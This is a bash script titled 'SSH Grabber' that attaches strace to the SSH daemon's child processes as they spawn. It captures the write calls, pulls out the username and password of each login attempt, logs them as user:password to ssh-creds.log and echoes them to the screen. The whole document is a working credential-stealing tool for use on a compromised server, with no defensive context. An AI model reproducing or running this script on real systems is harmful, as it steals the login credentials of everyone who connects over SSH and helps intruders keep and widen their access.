#!/bin/bash
# SSH Grabber by braindead

# Set the output file path
outfile=ssh-creds.log

# Make sure the SSH daemon is running
sshd=$(ps axo args | grep /sshd | grep -v grep)
if [ -z "$sshd" ]; then
	echo "The SSH server daemon is not running. Please start it."
	exit 1
fi

# Make sure strace is installed
strace=$(which strace)
if [ -z "$strace" ]; then
        echo "Strace cannot be found. Please install it and add its location to the path environment variable."
        exit 1
fi

# Function to extract username and password(s) from strace logs
function parse_creds () {
	local i=0
	while IFS='' read -r line || [[ -n "$line" ]]; do
		# Get lines that write to file descriptor 4 and have a length greater than 5
		if [[ "$line" == "write(4, "* ]] && (( $(echo "$line" | awk '{print $NF}') > 5 )); then
			# Get the quoted string and remove the first four hex characters
			local input=$(echo "$line" | cut -d '"' -f 2 | cut -c 17-)
			# Make sure there aren't any null bytes in the string
			if [[ "$input" != *"\x00"* ]]; then
				# Convert the string from hex to binary
				input=$(echo -e "$input")
				# Identify the username and password(s)
				if [ "$i" -eq "0" ]; then
					local user="$input"
				else
					echo "$user:$input" >>"$outfile"
					echo "Login attempt from $user:$input"
				fi
				let "i++"
			fi
		fi
	done < "$1"
	rm -f "$1"
}

# Listen for sshd child processes and strace them when they spawn
echo "Listening for SSH connections...press Ctrl-C to exit."
while [ 1 ]; do
	pid=$(ps aux | grep ssh | grep net | awk {' print $2'})
	if [ -n "$pid" ]; then
		strace -qx -s 250 -e trace=write -p "$pid" -o "strace$pid.log" && parse_creds "strace$pid.log"
	fi
done
